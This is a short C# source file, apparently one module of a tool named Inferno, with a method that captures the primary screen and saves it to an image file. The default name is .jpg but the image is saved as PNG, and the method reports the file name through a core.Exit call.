using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Inferno
{
    internal class desktop
    {

        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        // Make desktop screenshot
        public static void Screenshot(string filename = "screenshot.jpg")
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.Save(filename, ImageFormat.Png);

            output.filename = filename;
            core.Exit("Desktop screenshot created", output);
        }
    }
}
